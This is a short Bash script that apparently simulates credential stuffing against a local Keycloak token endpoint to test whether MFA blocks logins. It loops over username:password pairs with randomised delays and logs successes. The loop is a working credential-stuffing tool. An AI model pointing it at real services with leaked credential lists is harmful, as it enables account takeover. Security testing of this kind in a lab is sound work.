#!/bin/bash

# Bash version of attack curl for lightweight API hits
# Create creds.txt with lines like "username:password" for input

echo "Starting Bash Credential Stuffing Simulation..."


if ! command -v curl &> /dev/null; then
    echo "Error: curl not found."
    exit 1
fi

URL="http://localhost:8080/realms/myrealm/protocol/openid-connect/token"
CLIENT_ID="flask-app"
MAX_ATTEMPTS=100
CREDS_FILE="creds.txt"  

if [ ! -f "$CREDS_FILE" ]; then
    echo "user1:wrongpass
user1:test123
admin1:badpass
admin1:admin123" > "$CREDS_FILE"
    echo "Created sample $CREDS_FILE."
fi

attempts=0
successes=0

while IFS=: read -r username password; do
    for ((i=1; i<=20; i++)); do  
        attempts=$((attempts + 1))
        if [ $attempts -gt $MAX_ATTEMPTS ]; then break 2; fi

        sleep $(awk -v min=0.1 -v max=1 'BEGIN{srand(); print min+rand()*(max-min)}')

        RESPONSE=$(curl -s -X POST "$URL" \
            -d "grant_type=password" \
            -d "client_id=$CLIENT_ID" \
            -d "username=$username" \
            -d "password=$password")

        if echo "$RESPONSE" | grep -q "access_token"; then
            successes=$((successes + 1))
            echo "$(date) - Success: $username" | tee -a ../audit.log
        else
            echo "$(date) - Fail: $username" | tee -a ../audit.log
        fi
    done
done < "$CREDS_FILE"

echo "Attempts: $attempts, Successes: $successes (MFA should block all!)"
